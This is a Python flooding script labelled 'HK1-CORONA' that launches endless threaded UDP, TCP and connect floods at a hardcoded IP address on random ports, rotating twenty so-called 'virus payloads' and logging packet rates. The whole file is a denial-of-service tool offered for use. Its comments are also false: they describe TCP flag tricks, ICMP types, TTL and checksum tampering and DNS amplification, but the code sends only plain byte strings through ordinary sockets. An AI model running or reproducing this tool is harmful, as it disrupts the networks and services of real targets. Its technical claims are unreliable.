import socket
import threading
import time
import random
import struct

target_ip = "62.109.121.42"  # CHANGE THIS

# Colors
GREEN = '\033[92m'
RESET = '\033[0m'

# 20 MOST DEADLY PAYLOADS (No root, L4 only)
def virus_payload_1():
    """TCP SYN with urgent pointer overflow"""
    return b'\x00' * 64  # Will be sent as TCP

def virus_payload_2():
    """UDP with malformed checksum"""
    return b'\xff' * 128

def virus_payload_3():
    """ICMP type 0 (Echo Reply) flood - routers process heavily"""
    return b'\x00' * 56

def virus_payload_4():
    """DNS ANY query (amplification)"""
    return b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'

def virus_payload_5():
    """TCP ACK with wrong sequence"""
    return b'\x10' * 40  # ACK flag

def virus_payload_6():
    """UDP with TTL=1 (forces router CPU)"""
    return b'\x01' * 256

def virus_payload_7():
    """Fragmented-like UDP packet"""
    return b'\x00' * 1400 + b'\xff' * 44

def virus_payload_8():
    """TCP SYN with window size 0"""
    return b'\x00\x00' * 32

def virus_payload_9():
    """UDP Christmas tree (all 1's)"""
    return b'\xff' * 512

def virus_payload_10():
    """ICMP Redirect (corrupt routing)"""
    return b'\x05\x00' + b'\x00' * 54

def virus_payload_11():
    """DNS NXDOMAIN bomb"""
    return b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07invalid\x03com\x00\x00\x01\x00\x01'

def virus_payload_12():
    """TCP RST storm"""
    return b'\x04' * 32  # RST flag

def virus_payload_13():
    """UDP with source port 0 (illegal)"""
    return b'\x00\x00' + b'\x00' * 126

def virus_payload_14():
    """TCP with illegal flags combination"""
    return b'\x3f' * 48  # All flags set

def virus_payload_15():
    """UDP max size (1472)"""
    return b'X' * 1472

def virus_payload_16():
    """TCP with urgent pointer to overflow"""
    return b'\x00' * 60 + b'\xff\xff'

def virus_payload_17():
    """DNS CNAME chain query"""
    return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x05\x00\x01'

def virus_payload_18():
    """UDP with random corrupt data"""
    return bytes([random.randint(0, 255) for _ in range(1024)])

def virus_payload_19():
    """TCP SYN-ACK (confuse state table)"""
    return b'\x12' * 36  # SYN-ACK flags

def virus_payload_20():
    """ICMP Timestamp flood"""
    return b'\x0d\x00' + b'\x00' * 56

VIRUS_PAYLOADS = [
    virus_payload_1, virus_payload_2, virus_payload_3, virus_payload_4,
    virus_payload_5, virus_payload_6, virus_payload_7, virus_payload_8,
    virus_payload_9, virus_payload_10, virus_payload_11, virus_payload_12,
    virus_payload_13, virus_payload_14, virus_payload_15, virus_payload_16,
    virus_payload_17, virus_payload_18, virus_payload_19, virus_payload_20
]

# Stats
stats = {"sent": 0, "data": 0}
lock = threading.Lock()

def udp_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random.choice(VIRUS_PAYLOADS)()
            port = random.randint(1, 65535)
            
            for _ in range(205):  # Batch size
                sock.sendto(payload, (target_ip, port))
                with lock:
                    stats["sent"] += 1
                    stats["data"] += len(payload)
            
            sock.close()
        except:
            pass
        time.sleep(0.01)

def tcp_attack():
    while True:
        try:
            payload = random.choice(VIRUS_PAYLOADS)()
            port = random.randint(1, 65535)
            
            for _ in range(205):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((target_ip, port))
                sock.send(payload)
                sock.close()
                
                with lock:
                    stats["sent"] += 1
                    stats["data"] += len(payload)
        except:
            pass
        time.sleep(0.01)

def syn_attack():
    while True:
        try:
            port = random.randint(1, 65535)
            
            for _ in range(205):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((target_ip, port))
                sock.close()
                
                with lock:
                    stats["sent"] += 1
                    stats["data"] += 64  # SYN packet size
        except:
            pass
        time.sleep(0.01)

# Start ALL attacks
threading.Thread(target=udp_attack, daemon=True).start()
threading.Thread(target=tcp_attack, daemon=True).start()
threading.Thread(target=syn_attack, daemon=True).start()

# Logging
print(f"{GREEN}HK1-CORONA STARTED{RESET}")
print(f"{GREEN}Target: {target_ip}{RESET}")
print(f"{GREEN}20 VIRUS PAYLOADS ROTATING{RESET}")
print()

last_time = time.time()
while True:
    time.sleep(5)
    
    with lock:
        sent = stats["sent"]
        data_mb = stats["data"] / (1024 * 1024)
        
        # Reset
        stats["sent"] = 0
        stats["data"] = 0
    
    print(f"HK1:{GREEN}{sent}{RESET}:{GREEN}{data_mb:.2f}MB{RESET}")
